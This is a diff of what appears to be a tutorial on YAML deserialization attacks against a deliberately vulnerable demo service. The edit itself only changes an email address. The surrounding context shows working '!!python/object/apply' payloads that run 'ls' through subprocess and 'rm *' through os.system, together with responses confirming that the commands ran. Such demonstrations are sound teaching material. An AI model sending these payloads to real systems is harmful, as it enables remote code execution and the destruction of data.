@@ -142,13 +142,13 @@ POST /yaml
 ```yaml
 first_name: Tom
 last_name: Eastman
-email_address: tom@catalyst.net.nz
+email_address: tom@eastman.net.nz
 ```
 
 RESPONSE
 
 ```py
-{'email_address': 'tom@catalyst.net.nz',
+{'email_address': 'tom@eastman.net.nz',
 'first_name': 'Tom',
 'last_name': 'Eastman'}
 ```
@@ -170,14 +170,14 @@ POST /yaml
 ```yaml
 'first_name': Tom
 'last_name': Eastman
-'email_address': tom@catalyst.net.nz
+'email_address': tom@eastman.net.nz
 'birthday': !!python/object/apply:datetime.date [1980, 1, 1]
 ```
 
 RESPONSE
 
 ```py
-{'email_address': 'tom@catalyst.net.nz',
+{'email_address': 'tom@eastman.net.nz',
 'first_name': 'Tom',
 'last_name': 'Eastman',
 'birthday': datetime.date(1980, 1, 1)}
@@ -204,14 +204,14 @@ POST /yaml
 ```yaml
 'first_name': Tom
 'last_name': Eastman
-'email_address': tom@catalyst.net.nz
+'email_address': tom@eastman.net.nz
 'contents_of_cwd': !!python/object/apply:subprocess.check_output ['ls']
 ```
 
 RESPONSE
 
 ```py
-{'email_address': 'tom@catalyst.net.nz',
+{'email_address': 'tom@eastman.net.nz',
  'first_name': 'Tom',
  'last_name': 'Eastman',
  'contents_of_cwd': 'badservice.py\nbadservice.py~\nbob.yaml\nbob.yaml~\nthousandlaughs.xml\nxxe_1.xml\n'}
@@ -240,7 +240,7 @@ POST /yaml
 ```yaml
 'first_name': Tom
 'last_name': Eastman
-'email_address': tom@catalyst.net.nz
+'email_address': tom@eastman.net.nz
 'goodbye': !!python/object/apply:os.system ['rm *']
 'contents_of_cwd': !!python/object/apply:subprocess.check_output ['ls']
 ```
@@ -249,7 +249,7 @@ RESPONSE
 
 ```py
 {'first_name': 'Tom',
-'email_address': 'tom@catalyst.net.nz',
+'email_address': 'tom@eastman.net.nz',
 'last_name': 'Eastman',
 'goodbye': 0,
 'contents_of_cwd': '\n'}
